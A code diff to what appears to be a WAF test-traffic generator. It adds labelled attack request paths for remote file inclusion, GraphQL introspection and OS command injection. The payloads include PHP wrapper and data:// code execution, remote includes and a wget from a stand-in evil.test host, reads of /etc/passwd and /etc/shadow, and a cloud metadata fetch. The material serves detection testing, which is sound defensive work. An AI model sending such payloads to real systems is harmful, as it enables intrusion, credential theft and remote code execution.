@@ -700,6 +700,56 @@ def main() -> None:
     for i, p in enumerate(enterprise_ognl_paths):
         add("enterprise_ognl", f"203.0.122.{v4_last(10 + i)}", "GET", p)
 
+    # RFI — waf_rules.c rfi_patterns (php://, data://, remote include)
+    rfi_paths = [
+        "/include?page=http://evil.test/shell.txt",
+        "/load?file=https://evil.test/backdoor.php",
+        "/import?src=ftp://evil.test/payload.txt",
+        "/view?path=php://filter/convert.base64-encode/resource=index.php",
+        "/read?f=php://input",
+        "/fetch?u=data://text/plain,<?php+system('id');?>",
+        "/proxy?url=expect://id",
+        "/archive?z=zip://evil.zip%23shell.php",
+        "/glob?p=glob:///etc/passwd",
+        "/remote?inc=http://185.220.1.1/x.php",
+        "/template?file=ftps://evil.test/x",
+        "/render?src=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
+    ]
+    for i, p in enumerate(rfi_paths):
+        add("rfi", f"203.0.123.{v4_last(10 + i)}", "GET", p)
+
+    # GraphQL abuse — waf_rules.c graphql_patterns + derin nesting
+    graphql_paths = [
+        "/graphql?query={__schema{types{name}}}",
+        "/api/graphql?query=query+IntrospectionQuery{__schema{queryType{name}}}",
+        "/gql?query=mutation+{deleteUser(id:1)}",
+        "/v1/graphql?query={__typename}",
+        "/graphql?query=query+{__type(name:%22User%22){fields{name}}}",
+        "/api/graphql?query=query{__schema{mutationType{name}}}",
+        "/gql?query=query{__schema{subscriptionType{name}}}",
+        "/graphql?query=query{__type(name:\"User\"){fields{name}}}",
+    ]
+    for i, p in enumerate(graphql_paths):
+        add("graphql_abuse", f"203.0.124.{v4_last(10 + i)}", "GET", p)
+
+    # OS command injection — waf_rules.c shellcmd_patterns
+    shellcmd_paths = [
+        "/run?cmd=;id;",
+        "/exec?x=|whoami",
+        "/ping?host=8.8.8.8;cat+/etc/passwd",
+        "/api?p=$(id)",
+        "/shell?c=`id`",
+        "/diag?test=;ls+-la",
+        "/tool?arg=|cat+/etc/shadow",
+        "/run?cmd=&&+ping+-c+1+evil.test",
+        "/win?cmd=cmd.exe+/c+whoami",
+        "/ps?x=powershell+-enc+evil",
+        "/fetch?u=;wget+http://evil.test/x",
+        "/proxy?url=|curl+http://169.254.169.254/",
+    ]
+    for i, p in enumerate(shellcmd_paths):
+        add("shellcmd", f"203.0.125.{v4_last(10 + i)}", "GET", p)
+
     crlf_paths = [
         "/api/redirect?url=%0d%0aSet-Cookie:evil=1",
         "/proxy?target=foo%0d%0aX-Injected:1",
@@ -959,7 +1009,9 @@ def main() -> None:
         ("rce", "GET", "/run?cmd=;id+{}", UA_NORMAL),
         ("ssrf", "GET", "/fetch?url=http://169.254.169.254/{}", UA_NORMAL),
         ("scanner", "GET", "/probe/{}", 404, UA_SCAN),
-        ("api_abuse", "GET", "/graphql?query={{__schema{{types{{name}}}}}}&n={}", UA_NORMAL),
+        ("graphql_abuse", "GET", "/graphql?query={{__schema{{types{{name}}}}}}&n={}", UA_NORMAL),
+        ("rfi", "GET", "/load?file=php://filter/resource=index.php&n={}", UA_NORMAL),
+        ("shellcmd", "GET", "/run?cmd=;id+{};", UA_NORMAL),
         ("tr_scan", "GET", "/admin{}/login.php", 403, UA_SCAN),
         ("brute", "POST", "/api/auth?user=admin%27+OR+1%3D1--&n={}", 401, UA_NORMAL),
         ("ssti", "GET", "/render?v=%7B%7B{}%2A7%7D%7D", UA_NORMAL),
